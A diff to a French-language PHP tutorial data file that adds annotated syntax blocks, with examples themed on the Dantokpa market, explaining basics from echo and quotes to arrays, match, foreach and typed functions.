@@ -49,6 +49,13 @@ DEVDOCS.php = {
             { t: 'code', lang: 'bash', label: 'Installation pas à pas — Linux', code:
 '# 1. Option recommandée : le dépôt ondrej/php (toujours à jour)\nsudo add-apt-repository ppa:ondrej/php -y && sudo apt update\n#\n# 2. Installer PHP + extensions de base :\nsudo apt install php8.3 php8.3-cli php8.3-mbstring php8.3-xml -y\n#\n# 3. Vérifier :\nphp -v          # PHP 8.3.x (cli)…\n#\n# 4. Serveur intégré :\nphp -S localhost:8000\n# → http://localhost:8000' },
             { t: 'h3', h: 'Le premier script : la tradition du « Bonjour Dantokpa »' },
+            { t: 'syntax', title: 'Le premier script, décortiqué', lang: 'php', code:
+'<?php\n\necho "Bonjour Dantokpa !";', legend: [
+              ['<?php', 'la BALISE d\'ouverture : tout ce qui suit est du code PHP exécuté par le serveur — pas du texte affiché'],
+              ['echo', 'la SORTIE : écrire dans la réponse — texte, nombres, HTML. Ce n\'est pas une fonction, les parenthèses sont inutiles'],
+              ['"Bonjour Dantokpa !"', 'la chaîne de caractères entre guillemets doubles'],
+              [';', 'le POINT-VIRGULE final : EN PHP, TOUTE instruction se termine ainsi — l\'oubli est l\'erreur nº 1 de la première semaine']
+            ]},
             { t: 'code', lang: 'php', label: 'index.php', code:
 '<?php\n// Mon premier script PHP — Boutique Awa, marché Dantokpa\n$marche = \"Dantokpa\";\n$vendeuse = \"Awa Mensah\";\n$sacs = 12;\necho \"<h1>Bonjour $marche !</h1>\\n\";\necho \"<p>$vendeuse a $sacs sacs de gari en stock.</p>\";\n\n// Lancer avec : php -S localhost:8000\n// Puis ouvrir http://localhost:8000 dans le navigateur' },
             { t: 'p', h: 'Quand tu ouvres cette page dans le navigateur via `http://localhost:8000`, voici ce qui se passe en coulisses : le serveur intégré reçoit la requête, la passe à PHP, qui exécute ton code — les variables sont remplacées par leurs valeurs, le HTML est assemblé — et la page finale arrive au navigateur. L\'utilisateur ne voit JAMAIS le code PHP, uniquement le résultat. C\'est le cycle fondamental (la fiche « Exécuter PHP » le détaille).' },
@@ -108,11 +115,25 @@ DEVDOCS.php = {
             { t: 'h3', h: 'PHP vs les autres langages serveur : le choix de la simplicité' },
             { t: 'p', h: 'Contrairement à Node.js où tu construis ton serveur toi-même (`http.createServer`), ou à Python/Django qui impose une structure de projet avant la première ligne, PHP a un modèle radicalement simple : tu poses un fichier `.php` dans un dossier, le serveur web le trouve et l\'exécute. Pas de `npm start`, pas de `python manage.py runserver` obligatoire. Cette simplicité — un fichier = une page — est la raison pour laquelle PHP reste le langage le plus déployé sur les hébergements mutualisés : tu uploades par FTP et ça marche. C\'est aussi ce qui le rend idéal pour apprendre : tu te concentres sur la logique, pas sur l\'infrastructure.' },
             { t: 'h3', h: 'Les balises : la porte d\'entrée de PHP' },
+            { t: 'syntax', title: 'Entrer et sortir du mode PHP', lang: 'php', code:
+'<p>Cotonou, déjà.</p>\n<?php\necho "Il est " . date("H") . "h";\n?>\n<p>Suite de la page.</p>', legend: [
+              ['<?php', 'le BASCULEUR serveur : à partir d\'ici, PHP exécute — le navigateur ne verra jamais ce code'],
+              ['?>', 'la SORTIE de PHP : ce qui suit redevient du HTML envoyé tel quel — on peut entrer/sortir autant de fois que nécessaire'],
+              ['. (le point)', 'la CONCATÉNATION en PHP : coller les morceaux — ce n\'est PAS + (réservé aux nombres)'],
+              ['le piège du fichier pur', 'dans un fichier 100 % PHP, on OMET la balise fermante ?> finale : un espace après partirait dans la sortie et casserait les headers']
+            ]},
             { t: 'p', h: 'Un fichier .php est du **HTML par défaut**, qui bascule en mode « code » uniquement entre `<?php` et `?>`. Tout ce qui est hors de ces balises est envoyé tel quel au navigateur. C\'est ce qui rend PHP si naturel pour mélanger logique et présentation.' },
             { t: 'code', lang: 'php', label: 'index.php', code:
 '<!DOCTYPE html>\n<html lang="fr">\n<head><title>Marché de Dantokpa</title></head>\n<body>\n  <h1>Bienvenue à Dantokpa</h1>\n  <?php\n    // On entre en mode PHP : tout ici est exécuté sur le serveur\n    $ville = "Cotonou";\n    echo "<p>Page générée à " . date("H:i") . " depuis " . $ville . "</p>";\n  ?>\n  <p>Ce paragraphe est du HTML pur, PHP n\'y touche pas.</p>\n</body>\n</html>' },
             { t: 'callout', kind: 'tip', h: 'Si un fichier contient **uniquement du PHP** (config, fonctions, classes), la convention est d\'**omettre le `?>` final**. Un espace ou saut de ligne après `?>` serait envoyé au navigateur et casserait les `header()`/`session_start()` plus tard (« headers already sent »).' },
             { t: 'h3', h: 'echo et print : afficher' },
+            { t: 'syntax', title: 'echo, print : afficher, décortiqué', lang: 'php', code:
+'echo "Gari";\necho "Riz", " + ", "Huile";\nprint "Yam";', legend: [
+              ['echo "Gari"', 'la sortie de base — pas une fonction, juste une structure du langage : rapide et sans parenthèses'],
+              ['echo "a", "b"', 'echo accepte PLUSIEURS morceaux séparés par des virgules — un détail qui la distingue'],
+              ['print', 'quasi identique mais n\'accepte QU\'UN argument et renvoie 1 — en pratique : echo partout, print au musée'],
+              ['echo ne retourne rien', 'tu n\'écriras jamais $x = echo … ; le résultat part directement vers le navigateur']
+            ]},
             { t: 'p', h: '`echo` est une **construction du langage** (pas une vraie fonction) : pas de parenthèses obligatoires, accepte plusieurs arguments, microscopiquement plus rapide. `print` ressemble mais retourne toujours `1` et ne prend qu\'un argument. En pratique : utilise `echo` partout, et sache lire `print` dans du vieux code.' },
             { t: 'code', lang: 'php', code:
 '$produit = "gari";\n$prix = 500;\n\necho "Un sac de " . $produit . " coûte " . $prix . " FCFA.\\n";  // concaténation avec .\necho "Formaté : {$produit} — {$prix} FCFA\\n";                    // interpolation (guillemets doubles !)\necho "Une ligne", " et ", "une autre", " d\'un coup\\n";          // plusieurs arguments OK avec echo\n\n// Cours forcé sur les quotes :\necho \'Prix : $prix\';   // affiche littéralement : Prix : $prix\necho "Prix : $prix";   // affiche : Prix : 500' },
@@ -158,6 +179,13 @@ DEVDOCS.php = {
               'le navigateur affiche le résultat — impossible de revoir le code PHP d\'origine.'
             ] },
             { t: 'h3', h: 'Démarrer en dix secondes : le serveur intégré' },
+            { t: 'syntax', title: 'php -S : le serveur de dev, décortiqué', lang: 'bash', code:
+'php -S localhost:8000 -t public/', legend: [
+              ['php -S', 'lance le serveur de DÉVELOPPEMENT intégré : pas d\'Apache à installer pour apprendre'],
+              ['localhost:8000', 'TON poste uniquement, sur le port 8000 — invisible depuis l\'extérieur, donc sans risque'],
+              ['-t public/', 'la RACINE exposée (document root) : seul ce dossier est servi — la structure pro dès le premier jour'],
+              ['CTRL+C', 'arrête le serveur. Et en production, ce rôle revient à Nginx + PHP-FPM — jamais à php -S']
+            ]},
             { t: 'code', lang: 'bash', code:
 '# Vérifier l\'installation\nphp -v          # PHP 8.3.x (cli)…\n\n# Depuis le dossier du projet, lance le serveur de DÉVELOPPEMENT :\nphp -S localhost:8000\n\n# Avec une racine dédiée (recommandé : seul "public/" est exposé) :\nphp -S localhost:8000 -t public\n\n# → http://localhost:8000 dans le navigateur : ça tourne !' },
             { t: 'code', lang: 'php', label: 'info.php — le test traditionnel', code:
@@ -209,6 +237,13 @@ DEVDOCS.php = {
 '$vendeuse = "Awa Mensah";   // string\n$prix_sac = 500;            // int\n$taux_tva = 0.18;           // float\n$en_stock = true;           // bool\n\n// Règles de nom : lettre ou _ suivi de lettres, chiffres, _\n$_compteur = 1;             // OK\n$prixTotal = 1200;          // OK (convention camelCase courante)\n// $2sacs = 2;  ✗ invalide : commence par un chiffre\n// $prix-total = 5; ✗ le tiret est l\'opérateur moins ici !\n\n$ville = "Cotonou";\n$Ville = "Abomey-Calavi";   // ⚠ PHP distingue la casse : deux variables !' },
             { t: 'callout', kind: 'warn', h: 'Les noms de variables sont **sensibles à la casse** (`$ville` ≠ `$Ville`), mais pas les noms de fonctions (`ECHO` marche — ne le fais pas). Pourquoi cette asymétrie ? Les variables sont dans TA mémoire, PHP doit pouvoir les distinguer finement. Les fonctions, elles, sont dans une table interne que PHP a toujours traitée en insensible à la casse — un héritage des années 90 où les systèmes de fichiers eux-mêmes ne distinguaient pas la casse. Aujourd\'hui, cette différence est source de bugs : tu crois appeler `maFonction()` mais PHP exécute `mafonction()`. Convention : camelCase pour les variables, snake_case pour les fonctions — et surtout, ne compte JAMAIS sur l\'insensibilité à la casse des fonctions. Conventions : `camelCase` ou `snake_case`, mais sois constant dans un projet.' },
             { t: 'h3', h: 'Quotes simples vs doubles : l\'interpolation' },
+            { t: 'syntax', title: 'Quotes et concaténation, décortiquées', lang: 'php', code:
+'$prix = 1500;\necho "Total : $prix FCFA";    // interpolé : Total : 1500 FCFA\necho \'Total : \' . $prix;    // concaténé', legend: [
+              ['$prix', 'le $ OBLIGATOIRE devant tout nom de variable PHP — la signature du langage, sans exception'],
+              ['"… $prix FCFA"', 'guillemets DOUBLES : les variables y sont INTERPOLÉES — remplacées par leur valeur à la volée'],
+              ['\'…\'', 'guillemets SIMPLES : texte BRUT, jamais d\'interpolation — le $prix s\'afficherait tel quel'],
+              ['.', 'l\'opérateur de CONCATÉNATION : coller texte et variables morceau par morceau — pas + ! (+ reste pour les nombres)']
+            ]},
             { t: 'p', h: 'Entre **guillemets doubles**, PHP remplace les variables par leur valeur — c\'est l\'**interpolation**. Pourquoi deux types de guillemets ? Pour la performance : PHP ne regarde PAS l\'intérieur des apostrophes. Une chaîne `\'...\'` est prise telle quelle, en une seule passe. Une chaîne `"..."` est PARSÉE pour y chercher des `$`. Sur du texte volumineux, choisir les apostrophes pour le contenu statique économise du travail inutile. Et les accolades `{\$variable}` délimitent clairement la variable : `"{\$produit}s"` affichera `garis`. La concaténation se fait avec l\'opérateur `.` (point) — point de détail : les accolades `{ }` autour du nom lèvent toute ambiguïté sur la fin de la variable.' },
             { t: 'code', lang: 'php', code:
 '$produit = "gari";\n$prix = 500;\n\necho "Un sac de $produit coûte $prix FCFA.";       // interpolation ✓\necho "Un sac de {$produit}s ? {$prix} FCFA.";      // {...} : frontière claire\necho \'Un sac de $produit\';                        // AFFICHE $produit, tel quel !\necho \'Prix : \' . $prix . \' FCFA\';               // concaténation avec le point' },
@@ -258,6 +293,13 @@ DEVDOCS.php = {
               '`null` : une seule valeur, `NULL` — « pas de valeur », différent de vide.'
             ] },
             { t: 'h3', h: 'Inspecter : var_dump, gettype' },
+            { t: 'syntax', title: 'var_dump : la radiographie d\'une valeur', lang: 'php', code:
+'var_dump(1500);      // int(1500)\nvar_dump("1500");    // string(4) "1500"\nvar_dump(true);      // bool(true)', legend: [
+              ['var_dump($x)', 'le premier réflexe de débogage PHP : TYPE + valeur + taille, sans se mentir'],
+              ['int(1500)', 'le type est AFFICHÉ avec la valeur : "1500" entre guillemets est une string, pas un nombre'],
+              ['string(4)', 'la LONGUEUR en caractères — avec les espaces invisibles : les mystères de comparaison ratée s\'y révèlent'],
+              ['pourquoi pas echo', 'echo false affiche… RIEN ; var_dump(false) affiche bool(false) : pour déboguer, il n\'y a pas débat']
+            ]},
             { t: 'code', lang: 'php', code:
 '$test = [500, "FCFA", 0.18, true, null];\n\nvar_dump($test[0]);      // int(500)\nvar_dump($test[1]);      // string(4) "FCFA"\nvar_dump($test[2]);      // float(0.18)\nvar_dump($test[4]);      // NULL\n\necho gettype($test[3]);  // boolean\necho gettype(0.5);       // double   ← alias historique de float, ne t\'étonne pas' },
             { t: 'h3', h: 'Les prédicats is_* — et le trio isset / empty / is_null' },
@@ -297,6 +339,13 @@ DEVDOCS.php = {
             { t: 'code', lang: 'php', code:
 '$saisie = "42 sacs";\n\n(int) $saisie;         // 42\n(int) "abc";           // 0   ← silencieux : voilà le danger\n(float) "0.18";        // 0.18\n(string) 500;          // "500"\n(bool) "0";            // FALSE (piège légendaire !)\n(bool) "false";        // TRUE  (chaîne non vide)\n(array) "gari";        // ["gari"]\n\n// Alternatives fonctionnelles souvent plus lisibles :\nintval("42 sacs");     // 42\nfloatval("0.18");      // 0.18\nstrval(500);           // "500"' },
             { t: 'h3', h: '=== : la comparaison qui respecte les types' },
+            { t: 'syntax', title: '== , === et le cast explicite', lang: 'php', code:
+'"1500" == 1500      // true : PHP convertit dans ton dos\n"1500" === 1500    // false : types différents\n(int) "1500"       // 1500', legend: [
+              ['==', 'la comparaison LÂCHE : PHP jongle avec les types — "0" == false est vrai, et c\'est un piège historique'],
+              ['===', 'la comparaison STRICTE : type ET valeur — le réflexe pro, exactement comme en JavaScript'],
+              ['(int) "1500"', 'le CAST explicite : toi au volant des conversions — (float), (string), (bool) existent aussi'],
+              ['strict_types=1', 'declare(strict_types=1) en toute première ligne : PHP refuse les conversions implicites d\'arguments — la ceinture de sécurité moderne']
+            ]},
             { t: 'code', lang: 'php', code:
 '"1" == 1      // true  (jongle)\n"1" === 1      // false (string ≠ int) ✓ fiable\n\n// En entrée de formulaire, TOUT arrive en string :\n$age = $_POST[\'age\'] ?? "";           // "18" (string)\nif ($age === 18) { }                    // false… et heureusement qu\'on le sait\nif ((int) $age === 18) { }              // ✓ caster PUIS comparer strictement\n\nin_array(0, ["a", "b"])               // true 🤯 (jongle)\nin_array(0, ["a", "b"], true)         // false ✓ 3e argument = strict' },
             { t: 'h3', h: 'strict_types : un garde-fou moderne' },
@@ -333,9 +382,25 @@ DEVDOCS.php = {
           intro: 'Dans presque tous les langages, tu as DEUX structures : une pour les listes ordonnées (JS: `[]`, Python: `list`), une autre pour les paires clé→valeur (JS: `{}`, Python: `dict`). PHP a fait un choix radical : UN SEUL type `array` fait tout. Même syntaxe, mêmes fonctions — et c\'est pourquoi l\'array est la structure reine du langage : `$_GET`, les résultats SQL, les fichiers de config, tout est array. Ce choix unifié simplifie l\'apprentissage mais crée des subtilités (clés implicites, normalisation des indices) qu\'on va démonter.\' — indexés par des entiers OU par des chaînes, et même mélangés. C\'est la structure de données la plus utilisée du langage ; les superglobales, les résultats SQL, les configs… sont des tableaux.',
           blocks: [
             { t: 'h3', h: 'Indexés : listes ordonnées' },
+            { t: 'syntax', title: 'Le tableau indexé, décortiqué', lang: 'php', code:
+'$prix = [1200, 800, 2500];\n$prix[0];       // 1200\n$prix[] = 900;  // ajoute 900 à la fin\ncount($prix);   // 4', legend: [
+              ['[1200, 800, 2500]', 'le tableau INDEXÉ : PHP numérote les cases à partir de 0, tout seul'],
+              ['$prix[0]', 'lecture par INDICE entre crochets — 0 = premier élément, pas 1 !'],
+              ['$prix[] = 900', 'les crochets VIDES : « pousse à la fin » — le push idiomatique de PHP'],
+              ['count($prix)', 'le nombre d\'éléments, toujours à jour — ton ami pour toutes les boucles for'],
+              ['$prix[count($prix)-1]', 'le DERNIER élément : l\'indice final vaut toujours taille − 1']
+            ]},
             { t: 'code', lang: 'php', code:
 '$marche = ["gari", "ignames", "piment", "huile de palme"];\n$legacy = array("gari", "ignames");   // syntaxe historique, identique\n\necho $marche[0];       // gari (l\'index commence à 0 ! Ce n\'est pas une lubie de PHP — c\'est un héritage du C, où `array[i]` est du sucre pour `*(array + i)`. Si l\'index commençait à 1, l\'adresse du premier élément serait `array + 1 * sizeof(element)` — on sauterait le premier. PHP n\'utilise pas l\'arithmétique de pointeurs du C, mais il a gardé la convention. C\'est la même dans tous les langages dérivés du C (JS, Java, Python, Ruby). S\'y habituer, c\'est s\'habituer à l\'informatique tout entière.)\necho count($marche);   // 4\n\n$marche[] = "gombo";   // ajout en fin — index 5 ? non : 4\n$marche[] = "attiéké"; // index 5\n\n// foreach = LA boucle des tableaux (fiche Boucles)\nforeach ($marche as $i => $article) {\n    echo "$i : $article\\n";\n}' },
             { t: 'h3', h: 'Associatifs : clé ⇒ valeur' },
+            { t: 'syntax', title: 'Le tableau associatif, décortiqué', lang: 'php', code:
+'$produit = [\n    "nom"   => "gari",\n    "prix"  => 1200,\n    "stock" => 8,\n];\n$produit["prix"];   // 1200', legend: [
+              ['"nom" => "gari"', 'la CLÉ nommée pointe sa valeur avec => : le tableau ASSOCIATIF — LE couteau suisse de PHP'],
+              ['=>', 'la flèche grasse ASSOCIE clé et valeur (le simple égal n\'existe pas dans un tableau littéral)'],
+              ['$produit["prix"]', 'lecture par CLÉ, entre crochets et guillemets — comme un dictionnaire'],
+              ['la virgule finale', 'autorisée et encouragée : ajouter une ligne plus tard ne touche qu\'UNE ligne dans le diff Git'],
+              ['la star du web', 'formulaires ($_POST), sessions, résultats SQL : TOUT le PHP web parle en tableaux associatifs']
+            ]},
             { t: 'code', lang: 'php', code:
 '$prix = [\n    "gari"   => 500,     // clé string => valeur\n    "igname" => 300,\n    "piment" => 200,\n];\n\necho $prix["gari"];            // 500\n$prix["gombo"] = 150;          // ajout/modif par clé\nunset($prix["piment"]);        // suppression\n\nforeach ($prix as $produit => $montant) {\n    echo "$produit : $montant FCFA\\n";\n}' },
             { t: 'callout', kind: 'info', h: 'Les **clés sont uniquement `int` ou `string`**. PHP normalise les autres en silence : `"8"` devient `int(8)`, `true` devient `1`, `08.7` est tronqué en `8`. Ce n\'est pas un bug — c\'est documenté — mais c\'est une source de confusion quand tu crois avoir une clé `"8"` et que `array_key_exists` te dit le contraire. Les tableaux PHP sont toujours **ordonnés par ordre d\'insertion**, pas par clé. Si tu ajoutes `"gari" => 500` puis `"igname" => 300`, un `foreach` les lira TOUJOURS dans cet ordre. : `"8"` devient la clé int `8`, `true` devient `1`, `08.7` tronque à `8`. Les tableaux restent **ordonnés par ordre d\'insertion** — pas par clé.' },
@@ -373,6 +438,14 @@ DEVDOCS.php = {
             { t: 'code', lang: 'php', code:
 '// Une table "SQL-like" : tableau de lignes (chacune associative)\n$produits = [\n    ["nom" => "gari",   "prix" => 500, "stock" => 12],\n    ["nom" => "igname", "prix" => 300, "stock" => 30],\n];\n\necho $produits[0]["nom"];        // gari\necho $produits[1]["prix"];       // 300\n\n// Structure métier : le marché de Dantokpa en arborescence\n$marche = [\n    "gari"  => ["sacs" => ["blanc", "jaune"], "prix_sac" => 500],\n    "legumes" => ["piment" => 200, "gombo" => 150],\n];\n\necho $marche["gari"]["sacs"][0]; // blanc\necho $marche["gari"]["prix_sac"];// 500' },
             { t: 'h3', h: 'Parcourir : foreach imbriqués' },
+            { t: 'syntax', title: 'Table de données : le tableau de tableaux', lang: 'php', code:
+'$catalogue = [\n    ["nom" => "gari", "prix" => 1200],\n    ["nom" => "riz",  "prix" => 800],\n];\nforeach ($catalogue as $ligne) {\n    echo $ligne["prix"];\n}', legend: [
+              ['un tableau DE tableaux', 'LA structure du métier : exactement ce que renvoie une base de données — des LIGNES, chacune associatives'],
+              ['foreach ($catalogue as $ligne)', 'chaque tour sort UNE ligne entière dans $ligne'],
+              ['$ligne["prix"]', 'puis on lit la case par sa clé, comme tout associatif'],
+              ['$catalogue[0]["prix"]', 'l\'accès DIRECT croisé : ligne 0, colonne prix — lisible comme un tableur'],
+              ['$ligne["prix"] ?? 0', 'le réflexe colonne-optionnelle : ?? évite le warning quand une clé manque à la ligne']
+            ]},
             { t: 'code', lang: 'php', code:
 '$total = 0;\nforeach ($produits as $produit) {          // chaque LIGNE\n    echo $produit["nom"] . " : ";\n    foreach ($produit as $champ => $valeur) {  // chaque CHAMP\n        echo "$champ=$valeur ";\n    }\n    echo "\\n";\n    $total += $produit["prix"] * $produit["stock"];\n}\necho "Valeur du stock : $total FCFA";' },
             { t: 'callout', kind: 'warn', h: 'Ne réutilise jamais **le même nom** de variable dans deux foreach imbriqués (`foreach ($t as $v)` dans `foreach ($t as $v)`) : la boucle interne écrase celle de l\'externe. `$produit`/`$champ`, `$commande`/`$ligne` — des noms métier, pas `$a`/`$b`.' },
@@ -400,6 +473,14 @@ DEVDOCS.php = {
           intro: 'PHP embarque des dizaines de fonctions `array_*` qui expriment l\'intention directement : `array_filter` dit « je garde certains éléments » là où une boucle noie l\'intention dans la mécanique. Apprends les piliers (map, filter, reduce, merge, tri) et leurs **pièges sur les clés**.',
           blocks: [
             { t: 'h3', h: 'Transformer : array_map' },
+            { t: 'syntax', title: 'array_map / array_filter, décortiqués', lang: 'php', code:
+'$ttc = array_map(fn($p) => $p * 1.18, $prix);\n$enStock = array_filter($produits, fn($p) => $p["stock"] > 0);', legend: [
+              ['array_map(fn…, $tab)', 'TRANSFORME chaque élément : nouveau tableau de MÊME taille — note l\'ordre (fonction, tableau)'],
+              ['array_filter($tab, fn…)', 'GARDE ce qui passe le test — ATTENTION, l\'ordre est INVERSÉ : (tableau, fonction). Le piège historique de PHP'],
+              ['fn($p) => …', 'la petite fonction fléchée PHP : une seule expression, return implicite, capture automatique de l\'extérieur'],
+              ['array_reduce($tab, fn, $depart)', 'le troisième mousquetaire : FONDRE le tableau en une valeur (somme, prix max…)'],
+              ['comme en JS', 'map/filter/find du module JavaScript : même famille, mêmes idées — les notions voyagent']
+            ]},
             { t: 'code', lang: 'php', code:
 '$prix = [500, 300, 200];\n\n// fn (arrow function — fiche dédiée) : une expression, capture auto\n$avec_tva = array_map(fn($p) => (int) round($p * 1.18), $prix);\n// [590, 354, 236]\n\n// Attention : array_map RETOURNE un nouveau tableau, $prix n\'est pas modifié\n// et les clés numériques sont préservées avec UN seul tableau (perdues avec plusieurs).' },
             { t: 'h3', h: 'Filtrer : array_filter' },
@@ -457,6 +538,14 @@ DEVDOCS.php = {
             { t: 'code', lang: 'php', code:
 'switch ($mode_livraison) {\n    case "zemidjan":\n        echo "Livraison rapide en ville";\n        break;                     // ← SANS break, on TOMBE dans le cas suivant\n    case "taxi":\n    case "voiture":                // cas empilés = "OU"\n        echo "Livraison groupée";\n        break;\n    default:\n        echo "Retrait au marché";\n}' },
                         { t: 'h3', h: 'match (PHP 8) : le switch qui a grandi' },
+                        { t: 'syntax', title: 'match : l\'aiguillage qui renvoie une valeur', lang: 'php', code:
+'$badge = match(true) {\n    $stock > 0              => "Disponible",\n    $enCommande           => "Bientôt là",\n    default               => "Épuisé",\n};\n$tarif = match($zone) {\n    "Cotonou", "Calavi" => 500,\n    default             => 1000,\n};', legend: [
+              ['match($zone) {…}', 'évalue UNE expression et la compare à chaque cas — avec === STRICTE, fini les conversions surprise du switch'],
+              ['"Cotonou", "Calavi" => 500', 'plusieurs cas peuvent partager le même résultat, séparés par des virgules'],
+              ['match(true) {…}', 'la variante CONDITIONS : chaque branche teste sa propre expression — un if/elseif qui PRODUIT une valeur'],
+              ['=> dans les deux sens', 'cas => valeur : match RENVOIE directement — pas de break, pas de variable intermédiaire'],
+              ['default', 'le cas filet : SANS lui et sans correspondance, match lève une UnhandledMatchError — exception, pas silence']
+            ]},
             { t: 'p', h: '`match` n\'est pas juste un "switch amélioré" — c\'est un changement de paradigme. Là où `switch` est une INSTRUCTION (elle exécute du code, ne retourne rien), `match` est une EXPRESSION (elle RETOURNE une valeur). Concrètement, tu peux écrire `$label = match($x) { ... };` — et c\'est toute la différence. Les trois améliorations par rapport à switch : 1) comparaison STRICTE (`===` implicite), donc `"1"` ne matche pas `1` ; 2) pas de `break` à écrire — chaque bras est indépendant ; 3) si aucun cas ne correspond et qu\'il n\'y a pas de `default`, `match` lève une `UnhandledMatchError` — tu SAIS que tu as oublié un cas. En pratique : `switch` survit pour la compatibilité et les cas où plusieurs conditions partagent le même code (fallthrough), `match` est le choix par défaut pour tout nouveau code dès PHP 8.' },
             { t: 'h3', h: 'Sous le capot : pourquoi le fallthrough du switch existe' },
             { t: 'p', h: 'Le "fallthrough" (le fait que switch exécute le cas suivant si tu oublies break) n\'est pas un bug — c\'est un héritage direct du C, où cette mécanique permettait d\'optimiser des "tables de saut" (jump tables) dans le code machine. En C, empiler plusieurs `case` sans `break` était un pattern de performance. En PHP, cet héritage n\'a plus aucune justification de performance, mais il persiste pour compatibilité. Le seul usage légitime aujourd\'hui : grouper plusieurs cas qui partagent exactement le même traitement (`case "taxi": case "voiture": echo "Livraison groupée"; break;`). Dans tout autre cas, c\'est une source de bugs — et `match` l\'élimine structurellement.' },
@@ -498,6 +587,14 @@ DEVDOCS.php = {
             { t: 'code', lang: 'php', code:
 '$sac = 500; $budget = 1600;\nwhile ($budget >= $sac) {      // 0 tour possible (test d\'abord)\n    $budget -= $sac;\n}\necho "Reste : $budget FCFA";   // 100\n\n$essais = 0;\ndo {                            // AU MOINS un tour garanti\n    $essais++;\n} while ($essais < 1);' },
             { t: 'h3', h: 'foreach : la reine' },
+            { t: 'syntax', title: 'foreach : les deux formes, décortiquées', lang: 'php', code:
+'foreach ($produits as $produit) {\n    echo $produit["nom"];\n}\nforeach ($prixTva as $nom => $prix) {\n    echo "$nom : $prix\n";\n}', legend: [
+              ['foreach ($tab as $item)', 'LA boucle reine de PHP : chaque élément porte un nom lisible, zéro indice à gérer'],
+              ['as $nom => $prix', 'la forme enrichie : sur un associatif, la CLÉ ET la valeur en un seul tour'],
+              ['"\n"', 'le saut de ligne en sortie texte — entre guillemets DOUBLES pour être interprété (et nl2br() pour le HTML)'],
+              ['par VALEUR par défaut', 'foreach COPIE : modifier $produit ne touche pas le tableau — pour écrire dedans, &$produit (et son piège, vu juste après)'],
+              ['continue / break', 'continue saute au prochain tour, break SORT de la boucle — les deux freins d\'urgence']
+            ]},
             { t: 'code', lang: 'php', code:
 'foreach ($prix as $montant) {             // valeurs seules\n    echo "$montant FCFA\\n";\n}\n\nforeach ($prix as $produit => $montant) { // clé => valeur\n    echo "$produit : $montant FCFA\\n";\n}\n\n// Dans un template PHP/HTML mixte :\n// <?php foreach ($vendeuses as $v): ?> … <?php endforeach; ?>' },
             { t: 'h3', h: 'Piloter : break et continue' },
@@ -542,6 +639,14 @@ DEVDOCS.php.categories.push(
           intro: 'À la troisième fois que tu copies-colles les mêmes 15 lignes de calcul de TVA, une petite voix te dit « il doit y avoir un moyen de ne pas se répéter ». Ce moyen, c\'est la **fonction** : un bloc de code nommé, paramétrable, appelable depuis n\'importe où. PHP moderne (7+/8) a musclé le contrat : **types de paramètres et de retour**, valeurs par défaut, nullabilité explicite. Bien typer ses fonctions, c\'est transformer des bugs silencieux (`"10 sacs" + 2`) en `TypeError` immédiats — le bug est tué avant d\'atteindre la prod.\' PHP moderne (7+/8) a musclé le contrat : **types de paramètres et de retour**, valeurs par défaut, nullabilité explicite. Bien déclarer ses fonctions, c\'est transformer des erreurs silencieuses en TypeError immédiats.',
           blocks: [
             { t: 'h3', h: 'La forme complète' },
+            { t: 'syntax', title: 'La signature PHP moderne, décortiquée', lang: 'php', code:
+'function prixTtc(float $ht, float $taux = 0.18): float\n{\n    return $ht * (1 + $taux);\n}\nprixTtc(10000);       // 11800.0\nprixTtc(10000, 0.05); // surcharge le défaut', legend: [
+              ['function prixTtc(…)', 'la DÉCLARATION — pas de $ devant le nom de la fonction, jamais (le $ appartient aux variables)'],
+              ['float $ht', 'le paramètre TYPÉ : PHP refuse les valeurs incompatibles — les erreurs remontent au plus tôt'],
+              ['$taux = 0.18', 'la valeur par DÉFAUT si l\'appelant ne précise rien — les paramètres optionnels se DÉCLARENT À LA FIN'],
+              [': float', 'le type du RETOUR : la promesse est écrite et vérifiée — le contrat est complet'],
+              ['prixTtc(10000)', 'l\'appel : sans $, avec les arguments dans l\'ordre de déclaration (ou nommés, PHP 8)']
+            ]},
             { t: 'code', lang: 'php', code:
 '// Calcule le prix TTC d\'une ligne de commande\nfunction prix_ttc(float $ht, float $taux = 0.18): float\n{\n    return $ht * (1 + $taux);      // RETOURNE une valeur (echo ≠ return !)\n}\n\necho prix_ttc(500);            // 590 : $taux prend sa valeur par défaut\necho prix_ttc(500, 0.0);       // 500 : taux fourni\n// prix_ttc();                   // ArgumentCountError : $ht est requis' },
             { t: 'callout', kind: 'warn', h: 'Les paramètres **avec valeur par défaut viennent APRÈS** les paramètres requis. `function f($a = 1, $b)` est une erreur de logique (et PHP s\'en plaint) : comment fournir $b sans $a ?' },
@@ -595,6 +700,13 @@ DEVDOCS.php.categories.push(
             { t: 'code', lang: 'php', code:
 '// ...$nombres COLLECTE tous les arguments restants dans un tableau\nfunction total(float ...$nombres): float\n{\n    return array_sum($nombres);     // $nombres est un array ici\n}\n\ntotal(500, 300, 200);          // 1000\ntotal();                        // 0 (tableau vide)\n\n// À l\'appel, ... DÉPLIE un tableau en arguments (spread) :\n$ligne = [500, 300, 200];\ntotal(...$ligne);               // 1000 — l\'aller-retour du ...' },
             { t: 'h3', h: 'Arguments nommés (PHP 8)' },
+            { t: 'syntax', title: 'Les arguments nommés, décortiqués', lang: 'php', code:
+'function livrer(float $prix, string $ville = "Cotonou", bool $express = false): string\n{\n    return "$ville" . ($express ? " EXPRESS" : "");\n}\nlivrer(prix: 2500, express: true);', legend: [
+              ['prix: 2500', 'on NOMME l\'argument à l\'appel : l\'ordre n\'a plus d\'importance, et le code se lit comme une phrase'],
+              ['express: true', 'on SAUTE les paramètres du milieu sans répéter leurs défauts — directement celui qui nous intéresse'],
+              ['lecture instantanée', 'livrer(2500, "Cotonou", true) → mystère ; avec les noms → évident. Le futur relecteur te remercie'],
+              ['partout', 'fonctions, méthodes, constructeurs : les arguments nommés fonctionnent sur tout le PHP 8 moderne']
+            ]},
             { t: 'code', lang: 'php', code:
 'function livrer(string $zone, int $delai = 1, bool $express = false): string\n{\n    return "$zone — J+$delai" . ($express ? " (express)" : "");\n}\n\n// Positionnel classique : lisible ?\nlivrer("Abomey-Calavi", 2, true);\n\n// Nommé : auto-documenté, ordre libre, on saute les défauts\nlivrer(zone: "Abomey-Calavi", express: true);\nlivrer(express: true, zone: "Cotonou");          // ordre libre ✓\n\n// ⚠ Après un argument nommé, tous les suivants DOIVENT être nommés' },
             { t: 'h3', h: 'Récap express' },
@@ -628,6 +740,14 @@ DEVDOCS.php.categories.push(
             { t: 'code', lang: 'php', code:
